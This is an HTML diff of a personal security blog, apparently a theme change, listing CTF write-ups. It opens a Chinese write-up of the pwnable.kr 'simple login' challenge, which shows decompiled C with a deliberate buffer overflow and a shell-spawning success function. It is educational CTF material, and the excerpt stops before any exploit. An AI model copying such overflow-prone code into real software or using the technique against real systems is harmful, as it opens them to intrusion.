+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hyrathon的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
     </div>
-
-    <!-- Avatar & Name -->
-    <div class="mdl-card__supporting-text meta mdl-color-text--grey-600">
-        <!-- Author Avatar -->
-        <div id="author-avatar">
-            <img src="/img/avatar.png" width="32px" height="32px" alt="avatar">
-        </div>
-        <div>
-            <strong>Joachim Hyrathon</strong>
-        </div>
-    </div>
-</div>
-
-        <!-- Blog info -->
-<div class="mdl-card mdl-shadow--2dp something-else mdl-cell mdl-cell--8-col mdl-cell--4-col-desktop index-top-block">
-
-    <!-- Search -->
-    
-    <!-- Google -->
-    <div class="mdl-textfield mdl-js-textfield mdl-textfield--expandable" method="post" action="">
-        <label id="search-label" class="mdl-button mdl-js-ripple-effect mdl-js-button mdl-button--fab mdl-color--accent mdl-shadow--4dp" for="search">
-            <i class="material-icons mdl-color-text--white" role="presentation">search</i>
-        </label>
-
-        <form autocomplete="off" id="search-form" method="get" action="//google.com/search" accept-charset="UTF-8" class="mdl-textfield__expandable-holder" target="_blank">
-            <input class="mdl-textfield__input search-input" type="search" name="q" id="search" placeholder="">
-            <label id="search-form-label" class="mdl-textfield__label" for="search"></label>
-
-            <input type="hidden" name="sitesearch" value="http://yoursite.com">
-        </form>
-    </div>
-
-
-
-
-
-
-
-    <!-- LOGO -->
-    <div class="something-else-logo mdl-color--white mdl-color-text--grey-600">
-        <a href="#" target="_blank">
-            <img src="/img/logo.png" alt="logo" />
-        </a>
-    </div>
-
-    <!-- Infomation -->
-    <div class="mdl-card__supporting-text meta meta--fill mdl-color-text--grey-600">
-        <!-- Blog Title -->
-        <div>
-            <strong>Hyrathon的博客</strong>
-        </div>
-        <div class="section-spacer"></div>
-
-        <!-- Pages -->
-        <button id="show-pages-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-            <i class="material-icons" role="presentation">view_carousel</i>
-            <span class="visuallyhidden">Pages</span>
-        </button>
-        <ul class="mdl-menu mdl-js-menu mdl-menu--bottom-right" for="show-pages-button">
-            
-        </ul>
-
-        <!-- Menu -->
-        <button id="menubtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-            <i class="material-icons" role="presentation">more_vert</i>
-            <span class="visuallyhidden">show menu</span>
-        </button>
-        <ul class="mdl-menu mdl-js-menu mdl-menu--bottom-right" for="menubtn">
-            
-
-            
-
-            
-                <a class="index_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Hyrathon的博客&url=http://yoursite.com/&pic=&searchPic=false&style=simple" target="_blank">
-                    <li class="mdl-menu__item mdl-js-ripple-effect">
-                        Auf Weibo teilen
-                    </li>
-                </a>
-            
-
-            
-                <a class="index_share-link" href="https://twitter.com/intent/tweet?text=Hyrathon的博客&url=http://yoursite.com/&via=Joachim Hyrathon" target="_blank">
-                    <li class="mdl-menu__item mdl-js-ripple-effect">
-                        Auf Twitter teilen
-                    </li>
-                </a>
-            
-
-            
-                <a class="index_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/index.html" target="_blank">
-                    <li class="mdl-menu__item mdl-js-ripple-effect">
-                        Auf Facebook teilen
-                    </li>
-                </a>
-            
-
-            
-                <a class="index_share-link" href="https://plus.google.com/share?url=http://yoursite.com/" target="_blank">
-                    <li class="mdl-menu__item mdl-js-ripple-effect">
-                        Auf Google+ teilen
-                    </li>
-                </a>
-            
-
-            
-
-            
-
-            
-        </ul>
-    </div>
-</div>
-
-    
-    <div class="locate-thumbnail-symbol"></div>
-
-    <!-- Pin on top -->
-    
-
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/30/pablelgi/">pwnable.kr之simple login</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            这道题主要考察栈溢出. 在进入正题之前, 首先还是对栈帧结构做一个总结, 因为之前很久没做都忘了.
-
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/30/pablelgi/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 30, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/29/memcpy/">pwnable.kr之memcpy</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            感觉这道题考的是堆分配时字节对齐问题.
-首先上代码
-
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/29/memcpy/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 29, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/29/asmlong/">pwnable.kr之asm</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-这道题考查写shellcode, 用keystone折腾了半天上网一查发现我们对pwntools的运用真的不够熟练...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/29/asmlong/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 29, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/csaw2017-cvv/">CSAW 2017 CVV及tabIEZ writeup</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-因为需要准备出差, 只做了一些小题
-
-
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/csaw2017-cvv/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/Commercialapplication/">Sharif University Quals CTF 2014 Commercial Application</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/Commercialapplication/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/SECCONQualsCTF2015Reverse-EngineeringAndroidAPK1/">SECCON Quals CTF 2015 Reverse-Engineering Android APK 1</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/SECCONQualsCTF2015Reverse-EngineeringAndroidAPK1/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/boomshakalaka-3/">0CTF 2016 boomshakalaka-3</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/boomshakalaka-3/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/VEZEL100/">0CTF 2015 Quals CTF VEZEL</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            # 
-Category: MobilePoints: 10...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/VEZEL100/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/zctf-android-1/">ZCTF Android 1</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            先做笔记,最后整理成题解.
-首先对APK的Java层代码进行分析.入口的逻辑在Login.attemptLogin函数中该函数调用Au...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/zctf-android-1/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/helctf/">360 Hello CTF</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/helctf/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-    <!-- Index nav -->
-        <nav class="material-nav mdl-cell mdl-cell--12-col">
-            <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"><i class="material-icons" role="presentation">arrow_forward</i></button></a>
-        </nav>
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
-    $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
-</script>
-
-    
-</div>
-
-
-                    
-                        <!-- Overlay For Active Sidebar -->
-<div class="sidebar-overlay"></div>
-
-<!-- Material sidebar -->
-<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
-    <div id="sidebar-main">
-        <!-- Sidebar Header -->
-        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
-    <!-- Top bar -->
-    <div class="top-bar"></div>
-
-    <!-- Sidebar toggle button -->
-    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
-        <i class="material-icons">clear_all</i>
-        <span class="mdl-button__ripple-container">
-            <span class="mdl-ripple">
-            </span>
-        </span>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
     </button>
-
-    <!-- Sidebar Avatar -->
-    <div class="sidebar-image">
-        <img src="/img/avatar.png" alt="Joachim Hyrathon's avatar">
-    </div>
-
-    <!-- Sidebar Email -->
-    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
-        youremail@email.com
-        <b class="caret"></b>
-    </a>
+  </div>
 </div>
 
+<nav class="site-nav">
+  
 
-        <!-- Sidebar Navigation  -->
-        <ul class="nav sidebar-nav">
-    <!-- User dropdown  -->
-    <li class="dropdown">
-        <ul id="settings-dropdown" class="dropdown-menu">
-            
-                <li>
-                    <a href="#" target="_blank" title="Email Me">
-                        
-                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
-                        
-                        Email Me
-                    </a>
-                </li>
-            
-        </ul>
-    </li>
-
-    <!-- Homepage -->
-    
-        <li id="sidebar-first-li">
-            <a href="/">
-                
-                    <i class="material-icons sidebar-material-icons">home</i>
-                
-                Home
-            </a>
-        </li>
+  
+    <ul id="menu" class="menu">
+      
         
-    
-
-    <!-- Archives  -->
-    
-        <li class="dropdown">
-            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
-                
-                    <i class="material-icons sidebar-material-icons">inbox</i>
-                
-                    Archive
-                <b class="caret"></b>
-            </a>
-            <ul class="dropdown-menu">
-            <li>
-                <a class="sidebar_archives-link" href="/archives/2017/09/">September 2017<span class="sidebar_archives-count">16</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">August 2017<span class="sidebar_archives-count">1</span></a>
-            </ul>
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
         </li>
+      
         
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/30/pablelgi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/30/pablelgi/" itemprop="url">pwnable.kr之simple login</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-30T11:33:22+08:00">
+                2017-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
     
 
-    <!-- Categories  -->
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>这道题主要考察栈溢出. 在进入正题之前, 首先还是对栈帧结构做一个总结, 因为之前很久没做都忘了.</p>
+<p><img src="1.PNG" alt=""></p>
+<p>如图所示, 我总结的栈结构和其他说法有些不同, 方便自己记忆吧, 是否合理有待讨论.</p>
+<p>在这里我认为函数调用是父函数中断在某一个位置, 然后开始执行子函数的逻辑. EBP通常翻译成基址寄存器, 也就是当前栈底, 问题是父函数也有父函数, 而寄存器EBP只有一个, 因此在函数跳转时, 需要把父父函数的EBP保存在栈上. 另外需要保存的是父函数中断点PC后的下一个位置, 也就是当子函数执行回来时候, 父函数需要继续执行的位置, 很多材料里这个地址叫做ret, 感觉容易和汇编指令搞混.</p>
+<p>接下来上(IDA F5)代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> *decoded; <span class="comment">// [esp+18h] [ebp-28h]</span></div><div class="line">  <span class="keyword">char</span> s[<span class="number">30</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> len; <span class="comment">// [esp+3Ch] [ebp-4h]</span></div><div class="line"></div><div class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">30u</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Authenticate : "</span>);</div><div class="line">  _isoc99_scanf(<span class="string">"%30s"</span>, s);</div><div class="line">  <span class="built_in">memset</span>(&amp;secret, <span class="number">0</span>, <span class="number">12u</span>);</div><div class="line">  decoded = <span class="number">0</span>;</div><div class="line">  len = Base64Decode((<span class="keyword">int</span>)s, (<span class="keyword">char</span> *)&amp;decoded);</div><div class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">12</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong Length"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">memcpy</span>(&amp;secret, decoded, len);</div><div class="line">    <span class="keyword">if</span> ( auth(len) == <span class="number">1</span> )</div><div class="line">      correct();</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">_BOOL4 __<span class="function">cdecl <span class="title">auth</span><span class="params">(<span class="keyword">int</span> len)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></div><div class="line">  <span class="keyword">char</span> *s2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></div><div class="line">  <span class="keyword">char</span> *local_secret; <span class="comment">// [esp+20h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="built_in">memcpy</span>(&amp;local_secret, &amp;secret, len);</div><div class="line">  s2 = (<span class="keyword">char</span> *)calc_md5((<span class="keyword">int</span>)&amp;v2, <span class="number">12</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"hash : %s\n"</span>, s2);</div><div class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="string">"f87cd601aa7fedca99018a8be88eda34"</span>, s2) == <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">correct</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">if</span> ( secret == <span class="number">0xDEADBEEF</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulation! you are good!"</span>);</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>程序给了带shell的correct函数, 因此不需要构造shell, 一开始看到程序是静态编译, 因为要用ROP, 胡思乱想了半天.</p>
+<p>按照正常的逻辑执行, 用户输入正确的密码之后, auth函数进行校验通过, 条用correct函数, 验证secret前4字节=0xdeadbeef, 直接给出shell. 问题是, 这个正确密码无从得知, 需要通过溢出绕过验证.</p>
